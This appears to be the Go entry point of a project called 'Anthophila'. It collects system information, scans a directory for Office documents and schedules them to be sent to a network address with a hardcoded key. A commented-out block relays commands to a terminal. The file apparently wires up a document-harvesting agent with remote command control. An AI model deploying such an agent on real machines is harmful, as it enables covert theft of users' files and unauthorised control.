package main

import (
	"Anthophila/checkfile"
	"Anthophila/information"
	"Anthophila/management"
	"fmt"
	"time"
)

func main() {
	infoJson := information.NewInfo().InfoJson()
	directories := []string{"/Users/sirius/GolandProjects/Anthophila/"}
	file_cheker := checkfile.FileChecker{
		Address:             "localhost:12345",
		Key:                 []byte("a very very very very secret key"),
		Directories:         directories,
		SupportedExtensions: []string{".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx"},
		TimeStart:           []int8{10, 25},
		InfoJson:            infoJson}
	file_cheker.Start()
	manager := management.Manager{}
	manager.Start()
	for {
		// Цей цикл буде виконуватися вічно
		fmt.Println("Main goroutine continues...")
		time.Sleep(time.Second) // Можна змінити затримку за потреби
	}

	/*
		// Створюємо новий об'єкт TerminalManager
		terminal := terminal.NewTerminalManager()

		// Запускаємо термінал
		terminal.Start()

		// Запускаємо горутину для обробки виходу терміналу
		go func() {
			for line := range terminal.GetOutput() {
				fmt.Printf("Terminal > %s", line) //./sudo_expect.sh

			}
		}()

		// Основний цикл для взаємодії з користувачемCTR^C
		scanner := bufio.NewScanner(os.Stdin)
		for {
			if scanner.Scan() {
				command := scanner.Text()
				if strings.TrimSpace(command) == "exit" {
					terminal.Stop()
					break
				}
				terminal.SendCommand(command)
			}
			if err := scanner.Err(); err != nil {
				fmt.Fprintln(os.Stderr, "Error reading from stdin:", err)
				break
			}
		}

		fmt.Println("Exiting...")

	*/
}
